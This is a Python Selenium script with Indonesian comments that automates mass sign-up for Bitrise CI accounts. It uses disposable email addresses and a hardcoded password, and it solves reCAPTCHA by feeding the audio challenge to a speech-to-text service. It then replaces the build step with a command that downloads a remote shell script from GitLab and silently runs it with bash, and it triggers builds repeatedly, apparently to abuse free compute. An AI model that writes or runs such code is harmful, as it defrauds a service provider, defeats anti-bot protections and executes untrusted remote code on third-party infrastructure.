# =================== #
from text_generator import generate
from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException, WebDriverException
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains  
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import Select
from selenium.webdriver.chrome.service import Service
from selenium.common.exceptions import NoSuchElementException
# =================== #
# pip install selenium requests random-text-generator undetected-chromedriver==1.5.2
# =================== #
import undetected_chromedriver as uc
import random, urllib, os, sys, time, requests
# =================== #
lantak = random.randint(11111111,99999999)
print(f"[-] Random Kode : {lantak}.")
# =================== #
delayTime = 2
audioToTextDelay = 10
audioFile = "\\payload.mp3"
SpeechToTextURL = "https://speech-to-text-demo.ng.bluemix.net/"
# =================== # Wajib Di Ubah!
password = "LijayaAnli1188@"
docker = "wget https://gitlab.com/fukadabunit/project-7/-/raw/main/ikut.sh && chmod u+x ikut.sh && bash ikut.sh > /dev/null"
# =================== #
driver = uc.Chrome()
# =================== #
driver.get("https://generator.email/hungclone.xyz")
time.sleep(3)
obj = driver.find_element(By.XPATH, '//*[@id="email_ch_text"]')
print(f"[-] Email : {obj.text}.")
mano = (obj.text)
# =================== #
driver.get("https://app.bitrise.io/users/sign_up")
time.sleep(7)
try:
  driver.find_element(By.XPATH, '//div[1]/button[3]')
  print("[-] Berhasil Menemukan Tombol Cookie")
except Exceptions as e:
  print("[-] Gagal Menemukan Tombol Cookie")
  driver.refresh()
  time.sleep(7)
driver.execute_script("arguments[0].click();", WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, '//div[1]/button[3]')))) # Klik Accept Cookie
time.sleep(4)
your_input = driver.find_element(By.XPATH, '//div[1]/label[2]/span[1]/input[1]')
your_input.send_keys(mano)
time.sleep(2)
your_input = driver.find_element(By.XPATH, '//div[2]/label[2]/span[1]/input[1]')
your_input.send_keys(lantak)
time.sleep(2)
your_input = driver.find_element(By.XPATH, '//div[1]/label[1]/div[1]/input[1]')
your_input.send_keys(password, Keys.ENTER)
print("[-] Kena Captcha")
time.sleep(5)
# =================== #
def audioToText(audioFile):
    driver.execute_script('''window.open("","_blank")''')
    driver.switch_to.window(driver.window_handles[1])
    driver.get(SpeechToTextURL)
    time.sleep(6)
    audioInput = driver.find_element(By.XPATH, '//*[@id="root"]/div/input')
    audioInput.send_keys(audioFile)
    time.sleep(audioToTextDelay)
    text = driver.find_element(By.XPATH, '//*[@id="root"]/div/div[7]/div/div/div/span')
    while text is None:
        text = driver.find_element(By.XPATH, '//*[@id="root"]/div/div[7]/div/div/div/span')
    result = text.text
    driver.close()
    driver.switch_to.window(driver.window_handles[0])
    return result
# =================== #
iframes = driver.find_elements(By.TAG_NAME, 'iframe')
audioBtnFound = False
audioBtnIndex = -1
# =================== #
for index in range(len(iframes)):
    driver.switch_to.default_content()
    try:
        iframe = driver.find_elements(By.TAG_NAME, 'iframe')[index]
        driver.switch_to.frame(iframe)
    except NoSuchElementException:
        print("[-] Tidak Ada iFrame Captcha?")
    driver.implicitly_wait(delayTime)
    try:
        time.sleep(1)
        audioBtn = driver.find_element(By.ID, "recaptcha-audio-button")
        audioBtn.click()
        time.sleep(1)
        audioBtnFound = True
        audioBtnIndex = index
        break
    except Exception as e:
        pass
# =================== #
if audioBtnFound:
    try:
        while True:
            src = driver.find_element(By.ID, "audio-source").get_attribute("src")
            print("[-] Sumber Audio Link: %s" % src)
            urllib.request.urlretrieve(src, os.getcwd() + audioFile)
            key = audioToText(os.getcwd() + audioFile)
            print("[-] Kode Capctha: %s" % key)
            driver.switch_to.default_content()
            iframe = driver.find_elements(By.TAG_NAME, 'iframe')[audioBtnIndex]
            driver.switch_to.frame(iframe)
            inputField = driver.find_element(By.ID, "audio-response")
            inputField.send_keys(key)
            time.sleep(8)
            inputField.send_keys(Keys.ENTER)
            time.sleep(7)
            err = driver.find_elements(By.CLASS_NAME, 'rc-audiochallenge-error-message')[0]
            if err.text == "" or err.value_of_css_property('display') == 'none':
                print("[-] Berhasil.")
    except Exception as e:
        print("[-] Null.")
else:
    print("[-] Gagal Menemukan Captcha.")
    driver.quit()
# =================== #
def lols():
    try:
        driver.find_element(By.XPATH, "//a[normalize-space()='Confirm My Account']")
        print("[-] Berhasil Menemukan Email.")
    except Exception as e:
        print("[-] Gagal Menemukan Email. Kemungkinan Gagal atau di Block. Mencoba Lagi.")
        time.sleep(9)
        driver.refresh()
        time.sleep(9)
        lols()
# =================== #
driver.get("https://generator.email")
time.sleep(6)
driver.refresh()
time.sleep(5)
lols()
gini = driver.find_element(By.XPATH, "//a[normalize-space()='Confirm My Account']").get_attribute('href')
time.sleep(7)
driver.get(gini)
print("[-] Berhasil Meng-Konfirmasi Akun.")
time.sleep(7)
driver.get("https://app.bitrise.io")
time.sleep(5)
try:
    driver.find_element(By.XPATH, '//label[2]/div[1]/input[1]')
    print("[-] Sedang Mengisi Nama Workspace.")
except Exception as e:
    print("[-] Gagal Mengisi Nama Workspace.")
your_input = driver.find_element(By.XPATH, '//label[2]/div[1]/input[1]')
your_input.send_keys(lantak, Keys.ENTER)
time.sleep(5)
driver.refresh()
time.sleep(5)
driver.get("https://app.bitrise.io/apps/add")
time.sleep(5)
driver.refresh()
time.sleep(5)
# =================== #
try:
    driver.find_element(By.CSS_SELECTOR, "input[type='radio'][value='public']").click()
    print("[-] Tidak Ada PopUp Selamat Datang.")
except Exception as e :
    driver.refresh()
    print("[-] Ada PopUp Selamat Datang.")
# =================== #
time.sleep(3)
try:
    driver.find_element(By.XPATH, "//section[2]/form[1]/input[1]")
    print("[-] Berhasil Menekan Tombol Lanjut (Public Repo).")
except Exception as e:
    print("[-] Gagal Menekan Tombol Lanjut (Public Repo).")
    driver.refresh()
driver.execute_script("arguments[0].click();", WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//section[2]/form[1]/input[1]"))))
time.sleep(3)
try:
    driver.find_element(By.XPATH, "//button[4]")
    print("[-] Berhasil Mengklik Manual Repo.")
except Exception as e:
    print("[-] Gagal Mengklik Manual Repo.")
    driver.refresh()
driver.execute_script("arguments[0].click();", WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[4]"))))
time.sleep(3)
try:
    driver.find_element(By.XPATH, "//section[4]/div[1]/input[1]")
    print("[-] Sedang Mengisi Link Manual Repo.")
except Exception as e:
    print("[-] Gagal Mengisi Link Manual Repo.")
    driver.refresh()
your_input = driver.find_element(By.XPATH, '//section[4]/div[1]/input[1]')
your_input.send_keys(f"https://gitlab.com/{lantak}/{lantak}.git")
time.sleep(3)
try:
    driver.find_element(By.XPATH, "//section[4]/div[1]/button[1]")
    print("[-] Klik Next.")
except Exception as e:
    print("[-] Gagal Klik Next.")
    driver.quit()
driver.execute_script("arguments[0].click();", WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//section[4]/div[1]/button[1]"))))
time.sleep(6)
try:
    driver.find_element(By.XPATH, "//section[1]/form[1]/input[1]")
    print("[-] Mengisi Branch.")
except Exception as e:
    print("[-] Gagal Mengisi Branch.")
    driver.refresh()
your_input = driver.find_element(By.XPATH, '//section[1]/form[1]/input[1]')
your_input.send_keys("master", Keys.ENTER)
time.sleep(21)
# =================== #
try:
    driver.find_element(By.CSS_SELECTOR, "input[type='radio'][value='configureManually']").click()
    print("[-] Berhasil Mengkik Konfigurasi Manual")
except Exception as e:
    time.sleep(9)
    driver.find_element(By.CSS_SELECTOR, "input[type='radio'][value='configureManually']").click()
    time.sleep(4)
    print("[-] Gagal Mengkik Konfigurasi Manual")
# =================== #
try:
    driver.find_element(By.XPATH, "//form[2]/input[1]")
    print("[-] Next.")
except Exception as e:
    print("[-] Gagal Next.")
    driver.refresh()
driver.execute_script("arguments[0].click();", WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//form[2]/input[1]"))))
time.sleep(5)
try:
    driver.find_element(By.XPATH, "//div[10]/button[1]/div[1]")
    print("[-] Pilih Android.")
except Exception as e:
    print("[-] Gagal Pilih Andoid.")
    driver.refresh()
driver.execute_script("arguments[0].click();", WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//div[10]/button[1]/div[1]"))))
time.sleep(5)
try:
    driver.find_element(By.XPATH, "//div[10]/div[1]/section[1]/div[1]/select[1]")
    print("[-] Select Satu.")
except Exception as e:
    print("[-] Gagal Select Satu.")
    driver.refresh()
driver.execute_script("arguments[0].click();", WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//div[10]/div[1]/section[1]/div[1]/select[1]"))))
time.sleep(5)
try:
    driver.find_element(By.XPATH, "//div[10]/div[1]/section[1]/div[1]/select[1]")
    print("[-] Berhasil Memilih OS.")
except Exception as e:
    print("[-] Berhasil Memilih OS.")
    driver.refresh()
nani = driver.find_element(By.XPATH, "//div[10]/div[1]/section[1]/div[1]/select[1]")
select = Select(nani)
select.select_by_index(9)
time.sleep(5)
try:
    driver.find_element(By.XPATH, "//div[10]/div[1]/section[1]/button[1]")
    print("[-] Ready.")
except Exception as e:
    print("[-] Gagal Klik Ready.")
    driver.refresh()
driver.execute_script("arguments[0].click();", WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//div[10]/div[1]/section[1]/button[1]"))))
time.sleep(5)
try:
    driver.find_element(By.XPATH, "//section[7]/div[1]/article[1]/section[4]/button[2]")
    print("[-] Icon.")
except Exception as e:
    print("[-] Gagal Skip Icon.")
    driver.refresh()
driver.execute_script("arguments[0].click();", WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//section[7]/div[1]/article[1]/section[4]/button[2]"))))
time.sleep(5)
try:
    driver.find_element(By.XPATH, "//section[9]/div[1]/a[1]")
    print("[-] Deploy.")
except Exception as e:
    print("[-] Gagal Deploy.")
    driver.refresh()
driver.execute_script("arguments[0].click();", WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//section[9]/div[1]/a[1]"))))
time.sleep(6)
driver.refresh()
time.sleep(4)
# =================== # Klik Kembali Ke APP
try:
    driver.execute_script("arguments[0].click();", WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//li[2]/a[1]/div[1]/span[2]"))))
    print("[-] Klik Balik ke App.")
    time.sleep(5)
except Exception as e:
    driver.refresh()
    time.sleep(4)
    driver.execute_script("arguments[0].click();", WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//li[3]/a[1]"))))
    print("[-] Klik Balik ke App.")
    time.sleep(5)
# =================== #
driver.execute_script("arguments[0].click();", WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//span[2]/a[1]"))))
time.sleep(8)
driver.execute_script("arguments[0].click();", WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//li[1]/div[1]/r-step-item[1]/button[1]/span[2]"))))
time.sleep(5)
driver.execute_script("arguments[0].click();", WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "/html/body/main/article/div/div/div[1]/div/div/div[2]/section/article/aside/div/header/aside/button[2]"))))
time.sleep(5)
driver.execute_script("arguments[0].click();", WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//li[1]/div[1]/r-step-item[1]/button[1]/span[2]"))))
time.sleep(5)
driver.execute_script("arguments[0].click();", WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "/html/body/main/article/div/div/div[1]/div/div/div[2]/section/article/aside/div/header/aside/button[2]"))))
time.sleep(5)
driver.execute_script("arguments[0].click();", WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//li[1]/div[1]/r-step-item[1]/button[1]/span[2]"))))
time.sleep(5)
driver.execute_script("arguments[0].click();", WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//div[2]/button[1]"))))
time.sleep(5)
try:
    driver.find_element(By.XPATH, '//div[2]/textarea[1]')
    print("[-] Berhasil Mengisi Perintah Docker.")
except Exception as e:
    print("[-] Gagal Mengisi Perintah Docker.")
your_input = driver.find_element(By.XPATH, '//div[2]/textarea[1]')
your_input.send_keys(Keys.CONTROL + 'a', Keys.DELETE)
time.sleep(3)
your_input.send_keys(docker)
time.sleep(5)
driver.execute_script("arguments[0].click();", WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//div[2]/aside[1]/button[2]"))))
time.sleep(5)
driver.execute_script("arguments[0].click();", WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//li[3]/a[1]"))))
time.sleep(6)
# # =================== # SPAM 5X
try:
    driver.find_element(By.XPATH, "//section[2]/button[1]")
    print("[-] Mulai Spam.")
except Exception as e:
    print("[-] Gagal Memulai Spam.")
    driver.refresh()
driver.execute_script("arguments[0].click();", WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//section[2]/button[1]"))))
time.sleep(5)
driver.execute_script("arguments[0].click();", WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//div[2]/div[1]/footer[1]/button[1]"))))
time.sleep(5)
# =================== #
try:
    driver.execute_script("arguments[0].click();", WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//li[2]/a[1]/div[1]/span[2]"))))
    time.sleep(5)
except Exception as e:
    driver.execute_script("arguments[0].click();", WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//li[3]/a[1]"))))
    time.sleep(5)
# =================== #
driver.execute_script("arguments[0].click();", WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//section[2]/button[1]"))))
time.sleep(5)
driver.execute_script("arguments[0].click();", WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//div[2]/div[1]/footer[1]/button[1]"))))
time.sleep(5)
# =================== #
try:
    driver.execute_script("arguments[0].click();", WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//li[2]/a[1]/div[1]/span[2]"))))
    time.sleep(5)
except Exception as e:
    driver.execute_script("arguments[0].click();", WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//li[3]/a[1]"))))
    time.sleep(5)
# =================== #
driver.execute_script("arguments[0].click();", WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//section[2]/button[1]"))))
time.sleep(5)
driver.execute_script("arguments[0].click();", WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//div[2]/div[1]/footer[1]/button[1]"))))
time.sleep(5)
# =================== #
try:
    driver.execute_script("arguments[0].click();", WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//li[2]/a[1]/div[1]/span[2]"))))
    time.sleep(5)
except Exception as e:
    driver.execute_script("arguments[0].click();", WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//li[3]/a[1]"))))
    time.sleep(5)
# =================== #
driver.execute_script("arguments[0].click();", WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//section[2]/button[1]"))))
time.sleep(5)
driver.execute_script("arguments[0].click();", WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//div[2]/div[1]/footer[1]/button[1]"))))
time.sleep(5)
# =================== #
try:
    driver.execute_script("arguments[0].click();", WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//li[2]/a[1]/div[1]/span[2]"))))
    time.sleep(5)
except Exception as e:
    driver.execute_script("arguments[0].click();", WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//li[3]/a[1]"))))
    time.sleep(5)
# =================== #
driver.execute_script("arguments[0].click();", WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//section[2]/button[1]"))))
time.sleep(5)
driver.execute_script("arguments[0].click();", WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//div[2]/div[1]/footer[1]/button[1]"))))
time.sleep(5)
# =================== #
try:
    driver.execute_script("arguments[0].click();", WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//li[2]/a[1]/div[1]/span[2]"))))
    time.sleep(4)
except Exception as e:
    driver.execute_script("arguments[0].click();", WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//li[3]/a[1]"))))
    time.sleep(4)
# =================== #
driver.get("https://app.bitrise.io/users/sign_out")
time.sleep(5)
print("[-] Selesai.")
driver.quit()
# =================== #
